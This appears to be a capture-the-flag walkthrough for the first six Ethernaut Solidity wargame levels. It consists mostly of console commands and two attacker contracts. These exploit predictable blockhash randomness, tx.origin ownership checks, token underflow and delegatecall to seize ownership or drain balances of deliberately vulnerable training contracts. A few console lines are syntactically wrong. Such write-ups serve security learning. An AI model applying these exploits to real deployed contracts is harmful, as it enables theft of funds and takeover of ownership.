# Ethernaut
The Ethernaut is a Web3/Solidity based wargame inspired on overthewire.org, played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'.

## 1.Fallback
~~~
> contract.contribute({value:toWei("0.0001", "ether")})

> web3.eth.sendTransaction({to:"0x3D585bb9145ca9101D5EdA79E138D854242FF90C", 
	value:toWei("0.0001", "ether"), from:"0x76F2CCD13DB4D70DFB2114704BD9d4d6326bafA0"})
	
> contract.owner()
< [[PromiseResult]]: "0x76F2CCD13DB4D70DFB2114704BD9d4d6326bafA0"

> contract.withdraw()

> getBalance("0x3D585bb9145ca9101D5EdA79E138D854242FF90C")
< [[PromiseResult]]: "0"
~~~

## 2.Fallout
```
> contract.owner()
< [[PromiseResult]]: "0x0000000000000000000000000000000000000000"

> contract.Fal1out()

> contract.owner()
< [[PromiseResult]]: "0xedd0cCc6FeE49D502E8BfA3C6033ce0201afaD83"
```

## 3.CoinFlip
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import"./coinflip.sol";

contract coinflipAttack {
    CoinFlip public coinFlipAttack;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address victimaddress) public {
        coinFlipAttack = CoinFlip(victimaddress);
    }

    function flip() public returns (bool) {
        
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = uint256(blockValue/FACTOR);
        
        bool side = coinFlip == 1 ? true : false;

        coinFlipAttack.flip(side);
    }
}

> contract.address
< '0xb13583134DA43E7aAeE1a8E2d1BaFb8Bc03A10d7'
> await contract.consecutiveWins()    ( Calling this function 10 times )
```

## 4. Telephone
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import"./telephone.sol";

contract TelephoneHack {
    
    Telephone public telephonehack;

  constructor(address _address) public {
    telephonehack = Telephone(_address);
  }

  function Attack(address _address) public {
        telephonehack.changeOwner(_address);
    }
  
}


> contract.address
< '0x0b6F6CE4BCfB70525A31454292017F640C10c768'

> player
< '0xedd0cCc6FeE49D502E8BfA3C6033ce0201afaD83'

> await contract.owner()
< '0xedd0cCc6FeE49D502E8BfA3C6033ce0201afaD83'
```
## 5. Token
```
> await contract.balanceOf(player)
< 20
> contract.transfer('0xb3785404a938323134a7bcc4679cb26bee6dd41f',21)

> await contract.balanceOf(player)
< overflow
```

## 6.Delegation
```
> await.contract.owner()
< '0x9451961b7Aea1Df57bc20CC68D72f662241b5493'

> var pwnSignature = web3.utils.sha3("pwn()")
> pwnSignature
< '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab'
> contract.sendTransaction({data:pwnSignature})

> await.contract.owner()
< '0xedd0cCc6FeE49D502E8BfA3C6033ce0201afaD83'
